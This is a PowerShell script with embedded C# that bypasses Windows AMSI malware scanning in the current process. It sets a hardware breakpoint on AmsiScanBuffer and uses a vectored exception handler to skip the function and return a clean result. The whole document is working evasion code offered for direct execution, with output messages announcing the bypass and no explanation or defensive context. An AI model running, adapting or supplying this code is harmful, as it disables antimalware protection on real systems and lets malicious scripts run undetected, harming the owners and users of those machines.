$Code = @"
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;
using System.Collections.Generic;

public class HardwareBreakpoint
{
    // --- Win32 Imports ---
    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetCurrentThread();

    [DllImport("kernel32.dll")]
    static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll")]
    static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll")]
    static extern IntPtr AddVectoredExceptionHandler(uint First, IntPtr Handler);

    // --- Structures ---
    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT64
    {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;
        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;
        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;
    }

    // --- Global Target Address ---
    static IntPtr pAmsiScanBuffer = IntPtr.Zero;

    // --- Exception Handler ---
    public static long VectoredHandler(IntPtr PExceptionInfo)
    {
        // Offset 0 = ExceptionRecord. Offset 0 = ExceptionCode.
        // 0x80000004 = EXCEPTION_SINGLE_STEP (Hardware Breakpoint)
        IntPtr pExceptionRecord = Marshal.ReadIntPtr(PExceptionInfo);
        int exceptionCode = Marshal.ReadInt32(pExceptionRecord);

        if (exceptionCode == -2147483644) // 0x80000004
        {
            // Offset 8 = ContextRecord
            IntPtr pContextRecord = Marshal.ReadIntPtr(PExceptionInfo, 8);
            
            // In CONTEXT64, RIP is at offset 248 (0xF8)
            long Rip = Marshal.ReadInt64(pContextRecord, 0xF8);

            // Check if RIP matches AmsiScanBuffer
            if (Rip == (long)pAmsiScanBuffer)
            {
                // 1. Get Return Address from Stack (RSP is at offset 152 / 0x98)
                long Rsp = Marshal.ReadInt64(pContextRecord, 0x98);
                long ReturnAddress = Marshal.ReadInt64((IntPtr)Rsp);

                // 2. Simulate "RET" (Pop stack, set RIP to return address)
                Marshal.WriteInt64(pContextRecord, 0x98, Rsp + 8); // RSP += 8
                Marshal.WriteInt64(pContextRecord, 0xF8, ReturnAddress); // RIP = ReturnAddress

                // 3. Set Return Value (RAX) to S_OK (0)
                // RAX is at offset 120 / 0x78
                Marshal.WriteInt64(pContextRecord, 0x78, 0);

                return -1; // EXCEPTION_CONTINUE_EXECUTION
            }
        }
        return 0; // EXCEPTION_CONTINUE_SEARCH
    }

    // --- Delegate for VEH ---
    public delegate long HandlerDelegate(IntPtr PExceptionInfo);
    static HandlerDelegate del;

    public static void Enable()
    {
        // 1. Locate AMSI
        IntPtr hAmsi = LoadLibrary("amsi.dll");
        if (hAmsi == IntPtr.Zero) {
             Console.WriteLine("[-] Could not load amsi.dll");
             return;
        }

        pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
        Console.WriteLine("[*] AmsiScanBuffer: 0x" + pAmsiScanBuffer.ToString("x"));

        // 2. Register Handler
        del = new HandlerDelegate(VectoredHandler);
        IntPtr fnPtr = Marshal.GetFunctionPointerForDelegate(del);
        AddVectoredExceptionHandler(1, fnPtr);

        // 3. Set Hardware Breakpoint
        CONTEXT64 ctx = new CONTEXT64();
        ctx.ContextFlags = 0x10010; // CONTEXT_DEBUG_REGISTERS
        IntPtr hThread = GetCurrentThread();

        if (GetThreadContext(hThread, ref ctx))
        {
            ctx.Dr0 = (ulong)pAmsiScanBuffer;
            ctx.Dr7 |= 1; // Enable Dr0 (Local)
            SetThreadContext(hThread, ref ctx);
            Console.WriteLine("[+] Hardware Breakpoint Applied to current PowerShell thread.");
        }
    }
}
"@

# Compile the C# code in memory (Fixed typo here)
Add-Type -TypeDefinition $Code -Language CSharp

# Execute the bypass
[HardwareBreakpoint]::Enable()